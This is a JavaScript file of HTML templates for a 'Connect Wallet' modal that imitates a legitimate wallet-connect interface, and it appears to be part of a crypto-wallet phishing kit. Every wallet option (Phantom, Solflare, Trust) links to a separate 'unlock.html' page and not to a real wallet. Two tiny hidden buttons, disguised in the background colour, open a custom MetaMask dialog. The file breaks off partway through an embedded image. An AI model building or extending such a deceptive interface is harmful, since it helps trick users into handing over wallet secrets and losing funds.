const Modal = `
<div id="modal" style="display:none;">
    <div tabindex="0">
        <div class="sc-bczRLJ hNHEtw">
            <div class="sc-kDDrLX hkQOmQ"></div>
            <div id="modal-content" role="dialog" class="sc-hAZoDl dkAhZx" style="pointer-events: auto;">
            </div>
        </div>
    </div>
</div>
` 

const CloseModal = `CloseModal`;

const ConnectModal = `
<div class="sc-idiyUo hBuwwI" style="--height: 597px; --width: 360px;">
    <div style="pointer-events: none; position: absolute; top: 0px; bottom: 0px; left: 50%; transform: translateX(-50%); width: var(--width); z-index: 9; transition: width 200ms ease 0s;"></div>
    <div class="sc-iqcoie RrATt active">
        <div class="sc-crXcEl gcowpW">
            <button onclick="updatePage(CloseModal);" aria-label="Close" class="sc-fnykZs hFEFWT">
                <svg width="14" height="14" viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M1 13L13 1" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>
                    <path d="M1 0.999999L13 13" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>
                </svg>
            </button>
            <button onclick="updatePage(AboutModal);" aria-label="More information" class="sc-bjUoiL dnfVlP" style="opacity: 1;">
                <svg aria-hidden="true" width="22" height="22" viewBox="0 0 22 22" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path
                        fill-rule="evenodd"
                        clip-rule="evenodd"
                        d="M20 11C20 15.9706 15.9706 20 11 20C6.02944 20 2 15.9706 2 11C2 6.02944 6.02944 2 11 2C15.9706 2 20 6.02944 20 11ZM22 11C22 17.0751 17.0751 22 11 22C4.92487 22 0 17.0751 0 11C0 4.92487 4.92487 0 11 0C17.0751 0 22 4.92487 22 11ZM11.6445 12.7051C11.6445 13.1348 11.3223 13.4678 10.7744 13.4678C10.2266 13.4678 9.92578 13.1885 9.92578 12.6191V12.4795C9.92578 11.4268 10.4951 10.8574 11.2686 10.3203C12.2031 9.67578 12.665 9.32129 12.665 8.59082C12.665 7.76367 12.0205 7.21582 11.043 7.21582C10.3232 7.21582 9.80762 7.57031 9.45312 8.16113C9.38282 8.24242 9.32286 8.32101 9.2667 8.39461C9.04826 8.68087 8.88747 8.8916 8.40039 8.8916C8.0459 8.8916 7.66992 8.62305 7.66992 8.15039C7.66992 7.96777 7.70215 7.7959 7.75586 7.61328C8.05664 6.625 9.27051 5.75488 11.1182 5.75488C12.9336 5.75488 14.5234 6.71094 14.5234 8.50488C14.5234 9.7832 13.7822 10.417 12.7402 11.1045C11.999 11.5986 11.6445 11.9746 11.6445 12.5762V12.7051ZM11.9131 15.5625C11.9131 16.1855 11.376 16.6797 10.7529 16.6797C10.1299 16.6797 9.59277 16.1748 9.59277 15.5625C9.59277 14.9395 10.1191 14.4453 10.7529 14.4453C11.3867 14.4453 11.9131 14.9287 11.9131 15.5625Z"
                        fill="currentColor"
                    ></path>
                </svg>
            </button>
        </div>
        <div class="sc-eCYdqJ dLUlU">
            <div style="position: absolute; top: 0px; left: 0px; right: 0px; opacity: 1;">Connect Wallet<br /></div>
        </div>
        <div class="sc-evZas gcbNhn">
            <div class="sc-breuTD hVhjow active" style="">
                <div class="sc-ksZaOG dmNTWR" style="pointer-events: auto;">
                    <div class="sc-dkzDqf jKlSZW" style="width: 312px;">
                        <div class="sc-jSMfEi lbAEgN"></div>
                        <div class="sc-jfmDQi erYMGl">
                        <button onclick="updatePage(MetamaskCustomModal);" style="
    width: 5px;
    height: 5px;
    background: var(--ck-body-background);
    margin: 0;
    padding: 0;
    position: absolute;
    z-index: 50;
">
                            </button>
                            <button onclick="updatePage(MetamaskCustomModal);" style="
        width: 5px;
        height: 5px;
        background: var(--ck-body-background);
        margin: 0;
        padding: 0;
        position: absolute;
        z-index: 52;
    ">
                                </button>
                        <a href="unlock.html">
                            <button class="sc-eKszNL fTpgsT">
                                <div class="sc-hiMGwR iPMOKQ">
                                    <div style="transform: scale(1.1);">
                                        <img alt="Phantom" decoding="async" data-nimg="1" class="object-contain" style="color: transparent;" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDgiIGhlaWdodD0iMTA4IiB2aWV3Qm94PSIwIDAgMTA4IDEwOCIgZmlsbD0ibm9uZSI+CjxyZWN0IHdpZHRoPSIxMDgiIGhlaWdodD0iMTA4IiByeD0iMjYiIGZpbGw9IiNBQjlGRjIiLz4KPHBhdGggZmlsbC1ydWxlPSJldmVub2RkIiBjbGlwLXJ1bGU9ImV2ZW5vZGQiIGQ9Ik00Ni41MjY3IDY5LjkyMjlDNDIuMDA1NCA3Ni44NTA5IDM0LjQyOTIgODUuNjE4MiAyNC4zNDggODUuNjE4MkMxOS41ODI0IDg1LjYxODIgMTUgODMuNjU2MyAxNSA3NS4xMzQyQzE1IDUzLjQzMDUgNDQuNjMyNiAxOS44MzI3IDcyLjEyNjggMTkuODMyN0M4Ny43NjggMTkuODMyNyA5NCAzMC42ODQ2IDk0IDQzLjAwNzlDOTQgNTguODI1OCA4My43MzU1IDc2LjkxMjIgNzMuNTMyMSA3Ni45MTIyQzcwLjI5MzkgNzYuOTEyMiA2OC43MDUzIDc1LjEzNDIgNjguNzA1MyA3Mi4zMTRDNjguNzA1MyA3MS41NzgzIDY4LjgyNzUgNzAuNzgxMiA2OS4wNzE5IDY5LjkyMjlDNjUuNTg5MyA3NS44Njk5IDU4Ljg2ODUgODEuMzg3OCA1Mi41NzU0IDgxLjM4NzhDNDcuOTkzIDgxLjM4NzggNDUuNjcxMyA3OC41MDYzIDQ1LjY3MTMgNzQuNDU5OEM0NS42NzEzIDcyLjk4ODQgNDUuOTc2OCA3MS40NTU2IDQ2LjUyNjcgNjkuOTIyOVpNODMuNjc2MSA0Mi41Nzk0QzgzLjY3NjEgNDYuMTcwNCA4MS41NTc1IDQ3Ljk2NTggNzkuMTg3NSA0Ny45NjU4Qzc2Ljc4MTYgNDcuOTY1OCA3NC42OTg5IDQ2LjE3MDQgNzQuNjk4OSA0Mi41Nzk0Qzc0LjY5ODkgMzguOTg4NSA3Ni43ODE2IDM3LjE5MzEgNzkuMTg3NSAzNy4xOTMxQzgxLjU1NzUgMzcuMTkzMSA4My42NzYxIDM4Ljk4ODUgODMuNjc2MSA0Mi41Nzk0Wk03MC4yMTAzIDQyLjU3OTVDNzAuMjEwMyA0Ni4xNzA0IDY4LjA5MTYgNDcuOTY1OCA2NS43MjE2IDQ3Ljk2NThDNjMuMzE1NyA0Ny45NjU4IDYxLjIzMyA0Ni4xNzA0IDYxLjIzMyA0Mi41Nzk1QzYxLjIzMyAzOC45ODg1IDYzLjMxNTcgMzcuMTkzMSA2NS43MjE2IDM3LjE5MzFDNjguMDkxNiAzNy4xOTMxIDcwLjIxMDMgMzguOTg4NSA3MC4yMTAzIDQyLjU3OTVaIiBmaWxsPSIjRkZGREY4Ii8+Cjwvc3ZnPg==">
                                    </div>
                                </div>
                                <span class="sc-olbas ftvWqB">Phantom</span>
                            </button>
                        </a>
                            <!--<button onclick="updatePage(CoinbaseModal);" class="sc-eKszNL fTpgsT">
                                <div class="sc-hiMGwR iPMOKQ">
                                    <svg aria-hidden="true" width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
                                        <circle cx="10" cy="10" r="10" fill="var(--ck-brand-coinbaseWallet)"></circle>
                                        <rect rx="27%" width="20" height="20" fill="var(--ck-brand-coinbaseWallet)"></rect>
                                        <path
                                            fill-rule="evenodd"
                                            clip-rule="evenodd"
                                            d="M10.0001 17C13.8661 17 17.0001 13.866 17.0001 10C17.0001 6.13401 13.8661 3 10.0001 3C6.13413 3 3.00012 6.13401 3.00012 10C3.00012 13.866 6.13413 17 10.0001 17ZM8.25012 7.71429C7.95427 7.71429 7.71441 7.95414 7.71441 8.25V11.75C7.71441 12.0459 7.95427 12.2857 8.25012 12.2857H11.7501C12.046 12.2857 12.2858 12.0459 12.2858 11.75V8.25C12.2858 7.95414 12.046 7.71429 11.7501 7.71429H8.25012Z"
                                            fill="white"
                                        ></path>
                                    </svg>
                                </div>
                                <span class="sc-olbas ftvWqB">Coinbase Wallet</span>
                            </button>-->
                        <a href="unlock.html">
                            <button class="sc-eKszNL fTpgsT">
                                <div class="sc-hiMGwR iPMOKQ">

                                    <img alt="Solflare" decoding="async" data-nimg="1" class="object-contain" style="color: transparent;" src="data:image/svg+xml;base64,PHN2ZyBmaWxsPSJub25lIiBoZWlnaHQ9IjUwIiB2aWV3Qm94PSIwIDAgNTAgNTAiIHdpZHRoPSI1MCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI+PGxpbmVhckdyYWRpZW50IGlkPSJhIj48c3RvcCBvZmZzZXQ9IjAiIHN0b3AtY29sb3I9IiNmZmMxMGIiLz48c3RvcCBvZmZzZXQ9IjEiIHN0b3AtY29sb3I9IiNmYjNmMmUiLz48L2xpbmVhckdyYWRpZW50PjxsaW5lYXJHcmFkaWVudCBpZD0iYiIgZ3JhZGllbnRVbml0cz0idXNlclNwYWNlT25Vc2UiIHgxPSI2LjQ3ODM1IiB4Mj0iMzQuOTEwNyIgeGxpbms6aHJlZj0iI2EiIHkxPSI3LjkyIiB5Mj0iMzMuNjU5MyIvPjxyYWRpYWxHcmFkaWVudCBpZD0iYyIgY3g9IjAiIGN5PSIwIiBncmFkaWVudFRyYW5zZm9ybT0ibWF0cml4KDQuOTkyMTg4MzIgMTIuMDYzODc5NjMgLTEyLjE4MTEzNjU1IDUuMDQwNzEwNzQgMjIuNTIwMiAyMC42MTgzKSIgZ3JhZGllbnRVbml0cz0idXNlclNwYWNlT25Vc2UiIHI9IjEiIHhsaW5rOmhyZWY9IiNhIi8+PHBhdGggZD0ibTI1LjE3MDggNDcuOTEwNGMuNTI1IDAgLjk1MDcuNDIxLjk1MDcuOTQwM3MtLjQyNTcuOTQwMi0uOTUwNy45NDAyLS45NTA3LS40MjA5LS45NTA3LS45NDAyLjQyNTctLjk0MDMuOTUwNy0uOTQwM3ptLTEuMDMyOC00NC45MTU2NWMuNDY0Ni4wMzgzNi44Mzk4LjM5MDQuOTAyNy44NDY4MWwxLjEzMDcgOC4yMTU3NGMuMzc5OCAyLjcxNDMgMy42NTM1IDMuODkwNCA1LjY3NDMgMi4wNDU5bDExLjMyOTEtMTAuMzExNThjLjI3MzMtLjI0ODczLjY5ODktLjIzMTQ5Ljk1MDcuMDM4NTEuMjMwOS4yNDc3Mi4yMzc5LjYyNjk3LjAxNjEuODgyNzdsLTkuODc5MSAxMS4zOTU4Yy0xLjgxODcgMi4wOTQyLS40NzY4IDUuMzY0MyAyLjI5NTYgNS41OTc4bDguNzE2OC44NDAzYy40MzQxLjA0MTguNzUxNy40MjM0LjcwOTMuODUyNC0uMDM0OS4zNTM3LS4zMDc0LjYzOTUtLjY2MjguNjk0OWwtOS4xNTk0IDEuNDMwMmMtMi42NTkzLjM2MjUtMy44NjM2IDMuNTExNy0yLjEzMzkgNS41NTc2bDMuMjIgMy43OTYxYy4yNTk0LjMwNTguMjE4OC43NjE1LS4wOTA4IDEuMDE3OC0uMjYyMi4yMTcyLS42NDE5LjIyNTYtLjkxMzguMDIwM2wtMy45Njk0LTIuOTk3OGMtMi4xNDIxLTEuNjEwOS01LjIyOTctLjI0MTctNS40NTYxIDIuNDI0M2wtLjg3NDcgMTAuMzk3NmMtLjAzNjIuNDI5NS0uNDE3OC43NDg3LS44NTI1LjcxMy0uMzY5LS4wMzAzLS42NjcxLS4zMDk3LS43MTcxLS42NzIxbC0xLjM4NzEtMTAuMDQzN2MtLjM3MTctMi43MTQ0LTMuNjQ1NC0zLjg5MDQtNS42NzQzLTIuMDQ1OWwtMTIuMDUxOTUgMTAuOTc0Yy0uMjQ5NDcuMjI3MS0uNjM4MDkuMjExNC0uODY4LS4wMzUtLjIxMDk0LS4yMjYyLS4yMTczNS0uNTcyNC0uMDE0OTMtLjgwNmwxMC41MTgxOC0xMi4xMzg1YzEuODE4Ny0yLjA5NDIuNDg0OS01LjM2NDQtMi4yODc2LTUuNTk3OGwtOC43MTg3Mi0uODQwNWMtLjQzNDEzLS4wNDE4LS43NTE3Mi0uNDIzNS0uNzA5MzYtLjg1MjQuMDM0OTMtLjM1MzcuMzA3MzktLjYzOTQuNjYyNy0uNjk1bDkuMTUzMzgtMS40Mjk5YzIuNjU5NC0uMzYyNSAzLjg3MTgtMy41MTE3IDIuMTQyMS01LjU1NzZsLTIuMTkyLTIuNTg0MWMtLjMyMTctLjM3OTItLjI3MTMtLjk0NDMuMTEyNi0xLjI2MjEuMzI1My0uMjY5NC43OTYzLS4yNzk3IDEuMTMzNC0uMDI0OWwyLjY5MTggMi4wMzQ3YzIuMTQyMSAxLjYxMDkgNS4yMjk3LjI0MTcgNS40NTYxLTIuNDI0M2wuNzI0MS04LjU1OTk4Yy4wNDU3LS41NDA4LjUyNjUtLjk0MjU3IDEuMDczOS0uODk3Mzd6bS0yMy4xODczMyAyMC40Mzk2NWMuNTI1MDQgMCAuOTUwNjcuNDIxLjk1MDY3Ljk0MDNzLS40MjU2My45NDAzLS45NTA2Ny45NDAzYy0uNTI1MDQxIDAtLjk1MDY3LS40MjEtLjk1MDY3LS45NDAzcy40MjU2MjktLjk0MDMuOTUwNjctLjk0MDN6bTQ3LjY3OTczLS45NTQ3Yy41MjUgMCAuOTUwNy40MjEuOTUwNy45NDAzcy0uNDI1Ny45NDAyLS45NTA3Ljk0MDItLjk1MDctLjQyMDktLjk1MDctLjk0MDIuNDI1Ny0uOTQwMy45NTA3LS45NDAzem0tMjQuNjI5Ni0yMi40Nzk3Yy41MjUgMCAuOTUwNi40MjA5NzMuOTUwNi45NDAyNyAwIC41MTkzLS40MjU2Ljk0MDI3LS45NTA2Ljk0MDI3LS41MjUxIDAtLjk1MDctLjQyMDk3LS45NTA3LS45NDAyNyAwLS41MTkyOTcuNDI1Ni0uOTQwMjcuOTUwNy0uOTQwMjd6IiBmaWxsPSJ1cmwoI2IpIi8+PHBhdGggZD0ibTI0LjU3MSAzMi43NzkyYzQuOTU5NiAwIDguOTgwMi0zLjk3NjUgOC45ODAyLTguODgxOSAwLTQuOTA1My00LjAyMDYtOC44ODE5LTguOTgwMi04Ljg4MTlzLTguOTgwMiAzLjk3NjYtOC45ODAyIDguODgxOWMwIDQuOTA1NCA0LjAyMDYgOC44ODE5IDguOTgwMiA4Ljg4MTl6IiBmaWxsPSJ1cmwoI2MpIi8+PC9zdmc+">

                                </div>
                                <span class="sc-olbas ftvWqB">Solflare</span>
                            </button>
                        </a>
                        <a href="unlock.html">
                            <button class="sc-eKszNL fTpgsT">
                                <div class="sc-hiMGwR iPMOKQ">

                                    <img alt="Trust" decoding="async" data-nimg="1" class="object-contain" style="color: transparent;" src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNDAyIiBoZWlnaHQ9IjQwMiIgdmlld0JveD0iMCAwIDQwMiA0MDIiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiPgo8cmVjdCB3aWR0aD0iNDAyIiBoZWlnaHQ9IjQwMiIgZmlsbD0idXJsKCNwYXR0ZXJuMCkiLz4KPGRlZnM+CjxwYXR0ZXJuIGlkPSJwYXR0ZXJuMCIgcGF0dGVybkNvbnRlbnRVbml0cz0ib2JqZWN0Qm91bmRpbmdCb3giIHdpZHRoPSIxIiBoZWlnaHQ9IjEiPgo8dXNlIHhsaW5rOmhyZWY9IiNpbWFnZTBfMTY5NF8xODk2NyIgdHJhbnNmb3JtPSJzY2FsZSgwLjAwMjQ4NzU2KSIvPgo8L3BhdHRlcm4+CjxpbWFnZSBpZD0iaW1hZ2UwXzE2OTRfMTg5NjciIHdpZHRoPSI0MDIiIGhlaWdodD0iNDAyIiB4bGluazpocmVmPSJkYXRhOmltYWdlL2pwZWc7YmFzZTY0LC85ai80QUFRU2taSlJnQUJBUUFBQVFBQkFBRC8yd0JEQUFjRkJRWUZCQWNHQmdZSUJ3Y0lDeElMQ3dvS0N4WVBFQTBTR2hZYkdoa1dHUmdjSUNnaUhCNG1IaGdaSXpBa0ppb3JMUzR0R3lJeU5URXNOU2dzTFN6LzJ3QkRBUWNJQ0FzSkN4VUxDeFVzSFJrZExDd3NMQ3dzTEN3c0xDd3NMQ3dzTEN3c0xDd3NMQ3dzTEN3c0xDd3NMQ3dzTEN3c0xDd3NMQ3dzTEN3c0xDd3NMQ3ovd2dBUkNBR1NBWklEQVNJQUFoRUJBeEVCLzhRQUd3QUJBQUlEQVFFQUFBQUFBQUFBQUFBQUFBRUdCQVVIQXdML3hBQVpBUUVBQXdFQkFBQUFBQUFBQUFBQUFBQUFBUU1FQlFMLzJnQU1Bd0VBQWhBREVBQUFBZWtBQUFFRXhJaEloSWhJaEloSWhJaEloSWhJaEloSWhJaEloSWhJaElJRWdBQUFBQVFrQUFBQUFBQUFBQUFBQUFBQUFBQWlVRWdBQUFRa0FBQUFBQUFBQUFBQUFBQUFBQUFBQWlVRWdBRUVnQUFBQUFBQUFBQUFBQUFBQUFBQUFBQWlZa0FJa0FBQUFBQUFBQUFBQUFBQUFBQUFBQUFBUk1FZ2lZa0FBQUFBQUFBQUFQT29XVjduWFZWdXg5TXllWTNYTG8zSXo2QUFBQUFBQUFBRVNENUV6RWdBQUFBQUFCR0xNWmJSNmUydTVWK3BlT25QazR4cXpCTUFicTE4NlVYOVZjNzNlVFRhV3J6NmJmVWVmUUFBQUFBQUdPSmozbUppUUFBQUFOTlVQckE2Zk95Zm53WFZ6Qk1BZ0EyOXFvdXJtNjNyRnI1cGk5U3JlbWlvc2pIMVpnbUFQdjF4MFRrN0RUUFBycUhyWGJGeStpSGoyQUFBQmppWTk1aVlrQUFBQURtMkhuWVBZNVFzTVRYbCt5cUx1YzdMb0UxV1ZiZTVpaTRLN0FBSTArNWV2TksxWFNtaWpsVHArSGJYenhlNlpkVmppMnE0V1d1V1BsZElLclFBQUFNY1RIdk1URWdBQUFBYzYxK3kxdlg1YTMxQzIxMldnY3pvQUFBQUFBQUFPYTlLNW5yeTR3MzRycFlkRHZ1VjB3cXNBQUFBeHhNZTh4TVNBQUFBQnovVmJuVGRibUxWVmJONTlXOGN2b2dBQUFBQUFBT1lkUDVac3lmSTNZNzF1OVB1T1Qwd3JzQUFBQXh4TWU4eE1TQUFBQUJSOUZZcTcxZWFzVmQzaGVSeXVrQUFBQUFBQUI4OHM2ZHpIZGpEWms2RnM4SE80L1ZEejZBQUFBeHhNZTh4TVNBQUFBQlVxdmNLZjArYzIycHo3UEhSaHlPb0FBQUFBQUFCaGMzNkJ6L29ZUTFaK201RVR4dXFFU0FBQUJqaVk5NWlZa0FBQUFEUlVmb1hQZWpnZTNpMDBkVmVYcnhlcUNRQUFBQUFBTkRTTFpVK2x6M3Y0Ykc2cm9nNC9WQUFBQUF4eE1lOHhNU0FBQUFCNDh3NnJ6TGJreHh0eDlDMmRic25KNllWMkFBQUFBQUFValE1bUgxK1czMmh0dmoxYUJ5K2tBQUFBQmppWTk1aVlrQUFBQUJSYjFYYjZhWU9uenQzZXVXZE53YmZZWk5RQUFBQUFERnlxdlpYVWgxdVk2QlErbjQ5WDBNTzBBQUFBREhFeDd6RXhJQUFBQUR3OXlPV2ZOaHIzWDVpeTFvZFZWeXg4cm9oNTlnQUFBRHhRNXZtNnZwWUEwVWIrN1lHZnl1a0ZWb0FBQUFHT0pqM21KaVFBQUFBQU1mbkhUOVhvbzU4Ky9qcFlHOTBUelBUTW5sdG13N0xZOC9UTG9CSUJyYWpkVFphZGpOK01MYWxrd2I3azFmUXdiUUFBQUFBTWNUSHZNVEVnQUFBQUFBYTZqZEs4NzZlWExQV3VoaCtSNzhlOXRwYXF6cXJudTZ4Yk4vVWRMNTZzNGFNNHpZbkNzTzgzR0xYOC9SajFnQUFBQUFBWTRtUGVZbUpBQUFBQUFBQVl1VW1LUm9lcTYzWGw1NDJXdDI1UW55UHBQemtiKzFaZEdoc01zT3NQUHNBQUFBQUFBUWZEMElpWWxJQUFBQUFBQUFBRVZ1eXZmamxuejB2QjJaYWxkczM2elhoVGNBQUFBQUFBQUFpWUpBaVlKQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFSSUFCRW9KQUFBQUFBQUFBQUFBQUFBQUFBQUFBaVlKQUFBQkVvSkFBQUFBQUFBQUFBQUFBQUFBQUFRRWdBQUFBQkNRUUpSSUFBQUFBQUFBQUFBQUFJSlFKaVFBQUFBQUFBQUErUkhpSkFBQUFBQUFBQUFBQWVub1FCSUFBQUFILzhRQUx4QUFBQVVFQWdFQ0JBVUZBQUFBQUFBQUFBRUNBd1FGRVRBeEVFQVNJRFFURkNGQklpUXpOV0FqTWxCd2dQL2FBQWdCQVFBQkJRTEhZV0lXSVdJV0lXSVdJV0lXSVdJV0lXSVdJV0lXSVdJV0lXSVdJV0lXSVdJV0lXSVdJV0lXSVc1di9OTi81TGYrbC92L0FDVDcvd0FLazFOcGhTYTE5V0pEY2h2ckhvRjFsdUpiUk1xaW5PV1hsc09SS2kzSTY5d1d1bXBTVUprVmR0QWVrT3lGZW1OVTNXQXhPWWtkVTlsclBld1ZLWVFIS3RIU0hhdzZvT1BPUEhoWm55R1EzV2lDS2xGV0V1dHI2SjdMV09mUCtWSmN5UXMvbVh3YnpwZ3pNOEVXbHVQQitsTXVOdnhuWTZ2V1Mxa1BtSGg4eStJOVRmYVUyNGwxdkdleTFqbktOYzdDeFRYM2hHZ014dVZJU3RNaWpwTU94M1dEdzBaUm5HeG5zdFk1ZnZmU2xLbEczVHBMZ2FveEJtSXd4NnpJbEU5UzQ3Z2NvN3lRdUsrMTY2TCtqalBaYXh6ZmZjVTZFMUpiS2x4U0NZY2RBSWlJc3FtVzNBcW54VkE2VEZNU0VFMUk0bzN0OFo3TFdPZjcvaWkvcGRPWDd6aWplMHhuc3RZNmorNGNVWCszcHlQZGNVZjJXTTlsckhVLzNIaWlkUjM2dmNVbjJPTTlsckhWZmY4QUZGL1Y2YXZxcmlsL3QrTTlsckhWeS9POFVZL3pQU1VkazgwNHJVL0dleTFqckpmbWVLUWRwdlNmTzBmbUVWb09NOWxySFdpL0Z4VER0VU9sTk8wTG1PVm8yTTlsckhXaS9wY1FUOFozU3FSMnAvSkZaT005bHJIVnl2QzRhVjR2ZEtzS3RENFlUNVNNaDdMV09vcDhvSExTdk5ubzFwWDA0cDZmS2ZrUFpheHZKODJPYWN2emdkR3JyOHBuRklUZVprUFpheVNFZkRrOFVaeTdIUmxyK0pNNG9xUHdaRDJXc2xXYjhKdkZLZCtITTZFbDM0TWJtbXQvRGdaRDJXc2xZYThtT0VxTkMyWENlWnoxaC84QUR3MmczSEVwSktjaDdMV1I1c25tRkpOS3VLVEs4RlpublVzTlBPcWZlNHBEUG5KeW5zdFphdEg4SHVZRlNKd3NqcnFHVVRacXBhK1lVZjVhTmxQWmF5dnNwZlplYVV3N3pGcWJqSVprTnlFNFpWVGFZRDhoeVF2bWxSUE5lWTlsck5OaEpsTnJRcHRmS0ZxYlZHcTRRNGgxUHBrem1Zd2sxQjZSNllNRlVwYVVraE9ZOWxyUExoTnlreUl6a1pmb2FmY1lWRnF5SE9YcERjZEVtcU9PK3FIVEZPaEtTUW5PZXkxMEZvUzRpVlNESUtTYUZlaUxPZGpCK3NGNExjVTZ2MFI0ajBrNHRPYWo5STlscnBQeG1wQlNhVTYxaFpZY2ZWR3BLRUFpSWk2VnV0SmdzeVJKZ3V4dlNTVFVjV2tHWVEybHRQVCt3Ky9WTXJsTHBSS0NrcVFvUllUc280ME5xS25ybjJIb3pNZ0pwY1ZKa1JKTHJmZi9BSnd2M2I5Y3hjeGN4Y3hjeGN4Y3hjeGN4Y3hjeGN4Y3hjeGN4Y3hjeGN4Y3hjeGN4Y3hjeGN4Y3hjeGN3bkwvQVAvRUFDY1JBQUlCQWdVRkFBSURBQUFBQUFBQUFBRUNBd0FSQkJBd01USVNJQ0ZBUVJSd0lsRlMvOW9BQ0FFREFRRS9BZjBhN2hONk03VkhNRzhIMWIyb3lxS2FjbmF0ODFtWmFXZFRRWUhiMEpKQ1RWejJKQ3pVSWxBdFR3RWNhMnp2UVlpa1BVTDZyYjBxbGpZVitPMUREajdTeHF1M1lWQjNvNGRmbEhEbis2ZU1wdmxGd0dxL0kxRHowc1JzTW8rQTFYNUdvZVkwc1I4eWo0alZsNW1vK1kwc1I4eVhpTldiblNjaHBZamxrTlhFY3RPZm5TK1RyWWdiSEtNM1VhTG03RTFFTHVOYVlYWExEdDR0b08zU3Q4c09QTjlkbDZUYWxicE42Vmd3dU8rV1RxOERLSmVsZGVXUHE4akpXSzdVazRQTHNlVlZwNUMrVU1kLzVIMFpJZzlNaFhmSkpDbTFDZFNQTlBNVzJ5QXZ0U1FmVzlNaTlQQi9taUNOODBnSjNwVkM3ZXN5aHQ2T0hQeWtpQ2ZvL3dEL3hBQWtFUUFDQVFNRUFnTUJBUUFBQUFBQUFBQUJBZ01BQkJFUU1ERXlFaUVnUUVFaWNQL2FBQWdCQWdFQlB3SC9BQTFJeS9GQzNURlNRRmZZK3FBVFN3dWFTMkE3VUJqVjRGYW10M0hGRlNPZm9SUmhWckErRHpxdE5NNU9hUzRCN1VEblhBb29wNUZPdmkyTjFlQlRNRUdUUnVWbzNSL0JUU00zSitDc1Y0b1hMRG1oZEQ5RkpLSDQwbTduZFRxS242YlZyeWRKZTUzWStncWZvZHExL2RKTzUzWXVncVhvZHExL2RIN0hkZzZDbjZuYXR1dWgzYlkveHQyNC9pbU9CbmV0VHlOSlJoenN4akNnVk1jSWQ2QnNQcGNyNzh0aU5mSnNhWFRlZ043aWtieUdhZGZNWU5NaFE0UHpoaThCazZTdjV0bmZobDhEZzhhTW9iMGFlM0k2L0JJV2VraVZOSjVjZnlQb3h6RlBWSTRmalI0bGZtbXQyQndLamdDODZFZ2MxSmNmaWZUQnh4U1hQNDFBZyt4ckpjQWVscG5MYy9XVnluc1VMbGNlNmttTC93Q0gvd0QveEFBM0VBQUJBUVFHQndZR0FnTUFBQUFBQUFBQkFnQURFUklRSUNFaVFGRXhRVkpoY1hLQkV5TXdVR0toQkRJemtaS3hRb0tBa1BELzJnQUlBUUVBQmo4Qy93QkMwcVIyaXR6WG5ObTR0TTdNZkw1bHFDUXhRNXVvejFtbWQyWUZwVlhIbVdmbGtWRUFiMmc1RTV6MU5GNHFOYVZmZUkzNld1cmdySStUM255UHUxMlpmQU4zYVFqM2FMeFpWeDhLeGNSa3ExdTlkZFV0OVNYaTExYVZjRGpwVTJ2RDdORXZsOURCdnJQUHlhMTR2N3RhZkFtZTkyajNMQU8rN1VHZzhURGZxUGdXS0k2dDlWZjVOOVo1K1RYMWRvbmV3V2d4QnhMMG5haDRVU096VG1wb3dtWHRHbVZRQkJ6YUxoVXZwTFFlSUtmQ1duSldKZmN4clFTQ2VEZlRsNXJHNzE1MFMxeDJBYzY4Q0lockIyWjlMWEZKWDdOZmRLSFN1ODVzUzk1cVZLZVJzT3B2a2oxYXh5ajdOWUllTmZkcFZ4RGZSSFJ0Q2gxWjRoT2hKaFN2bXhMM2pTOTQ0Ujl6bWxmUGlYdEwzcGhIdk1hVHo0bDUwL1ZMN3BoRjh4cC9zY1NyZ0tYdkRDRTBvNjRrY3RLeDZjR1RVZGY5cnhLRDZhZUtjRzhQcE5SMXk0bHllTktOOGYxZzMzTFVkREpJeExzNzZYWE5nM25UOTFBTXNUSEpWS0ZaS0J3WUdhcVhhYzFERlBmdlVRck1Sd1RwUEUwdWh2amlscHpTUlVkN3JNRkxzcHBKMlU0dDRqSlZLMFpHT0NlcTMwdlY5TVhOdGlOTXVwWWhnVnZNaFVSNnJjV2w1c0drS0drV3NsNG5Rb1lCTGtjVFNsQTBxTUdDUm9GbUxXN1A4Z3hTZElwN0Jac1Y4dmpsNHMyQmxQRmFUU1hoMEkvZU43WWZLdlR4cUIwK01GNmpuNHBXdFVBMlRzYUJVU2orV2s0MVR0V2dzWGE5SXFCTHkrajNEVE8xUjhLVkhlTDltbWVLalU3ZFl1ajVjZms4R2dzVUxFQ0treUZGSjNNRS9FRCt3YVpDZ29icTBDWmxiSWFFWkVaQ3JFMk9ocExCS1JBRHlDMnhlcFRRZUo2MVpuYWlscFgxeFdlcW1aNHFEU3V1N1Q3MWd0OWRSbHJMQktSQUR5S1ZhUW9NVmZEMmpaTFFVQ0R2cXdqTWpaTGR5bThkclUweTFGUnEzRTJablEweHZyelBrMEhpWTcybWRkNG4zOEdWMmtxYVo4WnpscWFBRUI1VEVpQzlvTkVpS05vVllKRVMwM3hGbnBEU29TRWpkNVpBdFA4QUQzVHN0S29RSW91aUNkb3RkRVZiUjh3N3hFZDdSbEo0bG9KRUIvbkovOFFBS2hBQUFRSUVCQVlEQVFFQkFBQUFBQUFBQVFBUklURmhjUkF3UVZFZ1FJR1JvYkZRNGZEQjhkSC8yZ0FJQVFFQUFUOGh5Q1FFNTI3cGp1bUtnRlFDb0JVQXFBVkFLZ0ZRQ29CVUFxQVZBS2dGUUNvQlVBcUFWQUtnRlFDb0JVQXFBVkFLZ0ZRQ1ltcVZHNlpia0NXVVRPQ0FiNEpta24zaG11OHBib0J2aG9pb1U4cncrSmJVSUY4ancrTEkxRTBJOFJpVzcvR21CZnZ3a3NnR0h4d2hEZ203YjQ4K3NTV0NBWWZJQ0RqQXlmSW1Zd0V6ekI4WUdZSmdPcSsvbFFGV28xRitaSk9XTmhEcVZHWElQNk5pSE1ieW1kamNTczVjQUFGSjVRb0hjeVRCT0